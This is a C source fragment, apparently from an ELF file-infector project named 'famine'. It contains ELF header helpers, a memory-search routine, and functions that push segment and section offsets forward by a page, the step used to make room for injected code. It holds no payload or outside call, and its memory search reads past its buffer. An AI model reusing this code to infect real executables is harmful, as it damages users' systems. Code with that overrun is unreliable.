#include "famine.h"

inline	Elf64_Shdr *elf_sheader(Elf64_Ehdr *header) {
		return (Elf64_Shdr *)((void*)header + header->e_shoff);
}

inline	Elf64_Phdr *elf_pheader(Elf64_Ehdr *header) {
		return (Elf64_Phdr *)((void*)header + header->e_phoff);
}

inline	Elf64_Shdr *elf_section(Elf64_Ehdr *header, int i) {
	return &elf_sheader(header)[i];
}

inline	Elf64_Phdr *elf_program(Elf64_Ehdr *header, int i) {
	return &elf_pheader(header)[i];
}

char			*elf_str_table(Elf64_Ehdr *header) {
	if (header->e_shstrndx == SHN_UNDEF)
		return NULL;
	return (char *)header + elf_section(header, header->e_shstrndx)->sh_offset;
}

char			*elf_lookup_string(Elf64_Ehdr *header, int offset) {
	char *strtab = elf_str_table(header);
	if (strtab == NULL)
		return NULL;
	return strtab + offset;
}

char			*ft_memstr(const void *ptr, char *s, size_t n)
{
	char	*s2;
	int		i;
	int		j;

	i = 0;
	j = 0;
	s2 = (char*)ptr;
	if (s[i] == '\0')
		return ((char*)s2);
	while (i < n)
	{
		if (s[j] == '\0')
			return ((char*)&s2[i]);
		if (s2[i + j] == s[j] && i + j < n)
			j++;
		else
		{
			j = 0;
			i++;
		}
	}
	return (0);
}

void			update_segment_64(Elf64_Ehdr *header, Elf64_Off offset)
{
	Elf64_Phdr	*program;
	int			i;

	i = 0;
	while (i < header->e_phnum)
	{
		program = elf_program(header, i++);
		if (program->p_offset >= offset)
		{
			program->p_offset += PAGE_SIZE;
		}
	}
}

void			update_section_64(Elf64_Ehdr *header, Elf64_Off offset)
{
	Elf64_Shdr	*section;
	int			i;

	i = 0;
	while (i < header->e_shnum)
	{
		section = elf_section(header, i++);
		if (section->sh_offset > offset)
		{
			section->sh_offset += PAGE_SIZE;
		}
	}
}
